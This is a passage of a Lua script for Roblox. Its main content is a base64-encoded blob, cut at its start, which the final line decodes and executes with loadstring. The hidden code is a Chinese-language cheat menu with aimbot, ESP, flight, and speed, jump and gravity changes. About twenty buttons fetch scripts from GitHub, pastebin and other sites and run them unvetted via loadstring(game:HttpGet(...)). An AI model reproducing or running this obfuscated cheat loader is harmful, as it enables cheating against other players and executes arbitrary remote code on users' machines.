Muc2hvd0JveCwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIG5wY0VzcFNldHRpbmdzLnNob3dCb3ggPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuuWQjeWtlyIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gbnBjRXNwU2V0dGluZ3Muc2hvd05hbWUsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBucGNFc3BTZXR0aW5ncy5zaG93TmFtZSA9IHYKICAgICAgICBlbmQKICAgIH0pCgogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5pi+56S66Led56a7IiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBucGNFc3BTZXR0aW5ncy5zaG93RGlzdGFuY2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBucGNFc3BTZXR0aW5ncy5zaG93RGlzdGFuY2UgPSB2CiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgLS0g5LiJ6ZSB5a6a77ya56e76YCfIC8g6Lez6LeDIC8g6YeN5YqbCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgbG9jYWwgbG9ja1NwZWVkLCBsb2NrSnVtcCwgbG9ja0dyYXYgPSBmYWxzZSwgZmFsc2UsIGZhbHNlCiAgICBsb2NhbCBzYXZlZFNwZWVkLCBzYXZlZEp1bXAsIHNhdmVkR3JhdiA9IDE2LCA1MCwgMTk2CiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGFwcGx5VmFsdWVzKCkKICAgICAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBpZiBub3QgaHVtIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGlmIGxvY2tTcGVlZCB0aGVuIGh1bS5XYWxrU3BlZWQgPSBzYXZlZFNwZWVkIGVuZAogICAgICAgIGlmIGxvY2tKdW1wIHRoZW4gaHVtLkp1bXBQb3dlciA9IHNhdmVkSnVtcCBlbmQKICAgICAgICBpZiBsb2NrR3JhdiB0aGVuIHdvcmtzcGFjZS5HcmF2aXR5ID0gc2F2ZWRHcmF2IGVuZAogICAgZW5kCiAgICAKICAgIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgYXBwbHlWYWx1ZXMoKQogICAgZW5kKQogICAgCiAgICBUYWIyOkNyZWF0ZVNlY3Rpb24oIuS4iemUgeWumiIpCiAgICBUYWIyOkNyZWF0ZUlucHV0KHsKICAgICAgICBOYW1lID0gIuiuvuWumuenu+mAn++8iOS7heS/neWtmOWAvO+8iSIsIAogICAgICAgIFBsYWNlaG9sZGVyVGV4dCA9IHRvc3RyaW5nKHNhdmVkU3BlZWQpLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgc2F2ZWRTcGVlZCA9IHRvbnVtYmVyKHR4dCkgb3IgMTYgCiAgICAgICAgICAgIGFwcGx5VmFsdWVzKCkKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlSW5wdXQoewogICAgICAgIE5hbWUgPSAi6K6+5a6a6Lez6LeD6auY5bqm77yI5LuF5L+d5a2Y5YC877yJIiwgCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcoc2F2ZWRKdW1wKSwKICAgICAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3QgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHR4dCkgCiAgICAgICAgICAgIHNhdmVkSnVtcCA9IHRvbnVtYmVyKHR4dCkgb3IgNTAgCiAgICAgICAgICAgIGFwcGx5VmFsdWVzKCkKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlSW5wdXQoewogICAgICAgIE5hbWUgPSAi6K6+5a6a6YeN5Yqb5YC877yI5LuF5L+d5a2Y5YC877yJIiwgCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcoc2F2ZWRHcmF2KSwKICAgICAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3QgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHR4dCkgCiAgICAgICAgICAgIHNhdmVkR3JhdiA9IHRvbnVtYmVyKHR4dCkgb3IgMTk2IAogICAgICAgICAgICBhcHBseVZhbHVlcygpCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLplIHlrprnp7vpgJ8iLCAKICAgICAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwgCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSAKICAgICAgICAgICAgbG9ja1NwZWVkID0gdgogICAgICAgICAgICBhcHBseVZhbHVlcygpCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLplIHlrprot7Pot4MiLCAKICAgICAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwgCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSAKICAgICAgICAgICAgbG9ja0p1bXAgPSB2CiAgICAgICAgICAgIGFwcGx5VmFsdWVzKCkKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIumUgeWumumHjeWKmyIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIAogICAgICAgICAgICBsb2NrR3JhdiA9IHYKICAgICAgICAgICAgYXBwbHlWYWx1ZXMoKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgLS0gVlLohJrmnKwgVGFiCiAgICBsb2NhbCBUYWI1ID0gV2luZG93OkNyZWF0ZVRhYigiVlIiLCA3NzMzNzc5NjEwKQogICAgVGFiNTpDcmVhdGVCdXR0b24oe05hbWUgPSAiRkVWUuiEmuacrCIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmFuZG9tc3RyaW5nMC9Rd2VydHkvcmVmcy9oZWFkcy9tYWluL3F3ZXJ0eTQ1Lmx1YSIpKSgpCiAgICBlbmR9KQoKICAgIC0tIOaOp+WItuWPsCBUYWIKICAgIGxvY2FsIFRhYjYgPSBXaW5kb3c6Q3JlYXRlVGFiKCLmjqfliLblj7AiLCA3NzMzNzc5NjEwKQogICAgVGFiNjpDcmVhdGVCdXR0b24oe05hbWUgPSAi5o6n5Yi25Y+w6ISa5pysIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS95eGdoMTY1L3l4Z2gxNjUvbWFpbi82NjYiKSkoKQogICAgZW5kfSkKICAgIAogICAgLS0gWEHohJrmnKwgVGFiCiAgICBsb2NhbCBUYWI3ID0gV2luZG93OkNyZWF0ZVRhYigiWEHohJrmnKwiLCA3NzMzNzc5NjEwKQogICAgVGFiNzpDcmVhdGVCdXR0b24oe05hbWUgPSAiWEEgSFVCIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGNvZGUuY29tL1hpbmd0YWlkdWFuL1NjcmlwdHMvcmF3L21haW4vTG9hZGVyLmx1YSIpKSgpCiAgICBlbmR9KQogICAgCiAgICAtLSBSQuiEmuacrOS4reW/gyBUYWIKICAgIGxvY2FsIFRhYjggPSBXaW5kb3c6Q3JlYXRlVGFiKCJSQuiEmuacrCIsIDc3MzM3Nzk2MTApCiAgICBUYWI4OkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICJSYuiEmuacrCIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWXVuZ2VuZ3hpbi9yb2Jsb3gvcmVmcy9oZWFkcy9tYWluL1JiLUh1YiIpKSgpCiAgICBlbmR9KQogICAgCiAgICAtLSDnlJ/lrZjkuI7mnYDmiYsgVGFiCiAgICBsb2NhbCBUYWI5ID0gV2luZG93OkNyZWF0ZVRhYigi55Sf5a2Y5LiO5p2A5omLIiwgNzczMzc3OTYxMCkKICAgIFRhYjk6Q3JlYXRlQnV0dG9uKHtOYW1lID0gIueUn+WtmOS4juadgOaJiyIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTWlsYW4wOFN0dWRpby9DaGFpcldhcmUvbWFpbi9tYWluLmx1YSIpKSgpCiAgICBlbmR9KQogICAgCiAgICAtLSDniLHlvrfljY4gVGFiCiAgICBsb2NhbCBUYWIxMCA9IFdpbmRvdzpDcmVhdGVUYWIoIueIseW+t+WNjiIsIDc3MzM3Nzk2MTApCiAgICBUYWIxMDpDcmVhdGVCdXR0b24oe05hbWUgPSAi54ix5b635Y2OIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ndW1hbmJhL1NjcmlwdHMvbWFpbi9FZHdhcmQiKSkoKQogICAgZW5kfSkKICAgIAogICAgLS0g5rS75LqGN+WkqSBUYWIKICAgIGxvY2FsIFRhYjExID0gV2luZG93OkNyZWF0ZVRhYigi5rS75LqGN+WkqSIsIDc3MzM3Nzk2MTApCiAgICBUYWIxMTpDcmVhdGVCdXR0b24oe05hbWUgPSAi5rS75LqGN+WkqSIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhd3NjcmlwdHMubmV0L3Jhdy9Vbml2ZXJzYWwtU2NyaXB0LTctZGF5cy10by1saXZlLTM2ODI0IikpKCkKICAgIGVuZH0pCiAgICAKICAgIC0tIOatu+mTgei9qCBUYWIKICAgIGxvY2FsIFRhYjEyID0gV2luZG93OkNyZWF0ZVRhYigi5q276ZOB6L2oIiwgNzczMzk3OTYxMCkKICAgIFRhYjEyOkNyZWF0ZUJ1dHRvbih7TmFtZSA9ICLmrbvpk4HovagiLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2lvcGprbGJubXNzcy9TYW5zSHViU2NyaXB0L3JlZnMvaGVhZHMvbWFpbi9TYW5zSHViIikpKCkKICAgIGVuZH0pCgogICAgLS0g5LiA6Lev5ZCR6KW/5Yi36ZKxIFRhYgogICAgbG9jYWwgVGFiMTMgPSBXaW5kb3c6Q3JlYXRlVGFiKCLkuIDot6/lkJHopb8iLCA3NzMzOTc5NjEwKQogICAgVGFiMTM6Q3JlYXRlQnV0dG9uKHtOYW1lID0gIuS4gOi3r+WQkeilv+WIt+mSsSIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veXhnaDE2NS95eGdoMTY1L21haW4v5LiA6Lev5ZCR6KW/IikpKCkKICAgIGVuZH0pCiAgICAgICAgCiAgICAtLSDoh6rnhLbngb7lrrMgVGFiCiAgICBsb2NhbCBUYWIxNCA9IFdpbmRvdzpDcmVhdGVUYWIoIuiHqueEtueBvuWusyIsIDc3MzM5Nzk2MTApCiAgICBUYWIxNDpDcmVhdGVCdXR0b24oe05hbWUgPSAi6Ieq54S254G+5a6z6buR5rSedjYiLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXdzY3JpcHRzLm5ldC9yYXcvVW5pdmVyc2FsLVNjcmlwdC1TdXBlci1yaW5nLVBhcnRzLVY2LTI4NTgxIikpKCkKICAgIGVuZH0pCgotLSDkv4TkuqXkv4Tlt54gVGFiCiAgICBsb2NhbCBUYWIxNSA9IFdpbmRvdzpDcmVhdGVUYWIoIuS/hOS6peS/hOW3niIsIDc3MzM5Nzk2MTApCiAgICBUYWIxNTpDcmVhdGVCdXR0b24oe05hbWUgPSAiWEHkv4TkuqXkv4Tlt54iLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpbmd0YWlkdWFuL1NjcmlwdC9yZWZzL2hlYWRzL21haW4vR2FtZXMv5L+E5Lql5L+E5beeLmx1YSIpKSgpCiAgICBlbmR9KQoKLS0g5aKo5rC05ri45oiPIFRhYgogICAgbG9jYWwgVGFiMTYgPSBXaW5kb3c6Q3JlYXRlVGFiKCLloqjmsLTmuLjmiI8iLCA3NzMzOTc5NjEwKQogICAgVGFiMTY6Q3JlYXRlQnV0dG9uKHtOYW1lID0gIlhB5aKo5rC05ri45oiPIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9YaW5ndGFpZHVhbi9TY3JpcHQvcmVmcy9oZWFkcy9tYWluL0dhbWVzL+WiqOawtOa4uOaIjy5sdWEiKSkoKQogICAgZW5kfSkKCi0tIDk55aScIFRhYgogICAgbG9jYWwgVGFiMTcgPSBXaW5kb3c6Q3JlYXRlVGFiKCI5OeWknCIsIDc3MzM5Nzk2MTApCiAgICBUYWIxNzpDcmVhdGVCdXR0b24oe05hbWUgPSAiWEE5OeWknCIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWGluZ3RhaWR1YW4vU2NyaXB0L3JlZnMvaGVhZHMvbWFpbi9HYW1lcy/mo67mnpfkuK3nmoQ5OeWknC5sdWEiKSkoKQogICAgZW5kfSkKCi0tIGRvb3JzIFRhYgogICAgbG9jYWwgVGFiMTggPSBXaW5kb3c6Q3JlYXRlVGFiKCJkb29ycyIsIDc3MzM5Nzk2MTApCiAgICBUYWIxODpDcmVhdGVCdXR0b24oe05hbWUgPSAiZG9vcnPmsYnljJYiLCBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzY1VHdUOGphIikpKCkKICAgIGVuZH0pCgotLSDng4LmopfnpL7ljLogVGFiCiAgICBsb2NhbCBUYWIxOSA9IFdpbmRvdzpDcmVhdGVUYWIoIueDguail+ekvuWMuiIsIDc3MzM5Nzk2MTApCiAgICBUYWIxOTpDcmVhdGVCdXR0b24oe05hbWUgPSAi54OC5qKX56S+5Yy65Yi36ZKxIiwgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9YT1RSWE9OWS9FYXN5U2NyaXB0L21haW4vU3Vhby5sdWF1JykpKCkKICAgIGVuZH0pCgogICAgLS0g6K6+572uVGFiCiAgICBsb2NhbCBUYWIyMCA9IFdpbmRvdzpDcmVhdGVUYWIoIuiuvue9riIsIDc3MzM3Nzk2MTApCiAgICBUYWIyMDpDcmVhdGVCdXR0b24oewogICAgICAgIE5hbWUgPSAi5LiA6ZSu5aSN5Yi2RGlzY29yZOmTvuaOpSIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGRpc2NvcmRMaW5rID0gImh0dHBzOi8vZGlzY29yZC5nZy94VlVmN0g5TSIKICAgICAgICAgICAgbG9jYWwgc3VjY2VzcyA9IENvcHlUb0NsaXBib2FyZChkaXNjb3JkTGluaykKICAgICAgICAgICAgU2hvd0NvcHlOb3RpZmljYXRpb24oc3VjY2VzcywgZGlzY29yZExpbmspCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICAtLSDmuIXnkIblh73mlbAKICAgIFRhYjIwOkNyZWF0ZUJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICLmuIXnkIbmiYDmnInohJrmnKwiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAtLSDlgZzmraJBbnRpbG9jawogICAgICAgICAgICBBbnRpbG9ja01vZHVsZS5EZXN0cm95KCkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIOWBnOatokFpbWJvdAogICAgICAgICAgICBpZiBhaW1ib3RDb25uIHRoZW4KICAgICAgICAgICAgICAgIGFpbWJvdENvbm46RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBhaW1ib3RDb25uID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0g5YGc5q2i6aOe6KGMCiAgICAgICAgICAgIHN0b3BGbHlpbmcoKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0g5YGc5q2iRVNQCiAgICAgICAgICAgIGlmIGVzcExvb3AgdGhlbgogICAgICAgICAgICAgICAgZXNwTG9vcDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIGVzcExvb3AgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSDlgZzmraJOUEMgRVNQCiAgICAgICAgICAgIGlmIG5wY0VzcExvb3AgdGhlbgogICAgICAgICAgICAgICAgbnBjRXNwTG9vcDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIG5wY0VzcExvb3AgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSDmuIXnkIZEcmF3aW5n5a+56LGhCiAgICAgICAgICAgIGlmIGFpbUxpbmUgdGhlbgogICAgICAgICAgICAgICAgYWltTGluZTpSZW1vdmUoKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgbW91c2VGb3ZDaXJjbGUgdGhlbgogICAgICAgICAgICAgICAgbW91c2VGb3ZDaXJjbGU6UmVtb3ZlKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIGZpeGVkRm92Q2lyY2xlIHRoZW4KICAgICAgICAgICAgICAgIGZpeGVkRm92Q2lyY2xlOlJlbW92ZSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIua4heeQhuWujOaIkCIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gIuaJgOacieiEmuacrOWKn+iDveW3suWBnOatoiIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIC0tIOW/jeiAheazqOWFpeWZqOWFvOWuueaAp+ajgOafpQogICAgaWYgaWRlbnRpZnlleGVjdXRvciBhbmQgaWRlbnRpZnlleGVjdXRvcigpOmxvd2VyKCk6ZmluZCgibmluamEiKSB0aGVuCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAi5rOo5YWl5Zmo5qOA5rWLIiwKICAgICAgICAgICAgQ29udGVudCA9ICLlv43ogIXms6jlhaXlmajlt7Lor4bliKvvvIzmiYDmnInlip/og73lhbzlrrkiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbmQKICAgIAogICAgLS0g6aqM6K+B6YCa6L+H5ZCO5pKt5pS+5Yqo55S7CiAgICBDcmVhdGVTdGFycnlCYWNrZ3JvdW5kQW5pbWF0aW9uKCkKZW5kCgotLSDnm7TmjqXliJvlu7rkuLvnqpflj6PlhoXlrrkKQ3JlYXRlTWFpbldpbmRvd0NvbnRlbnQoKQ==")
loadstring(decoded)()
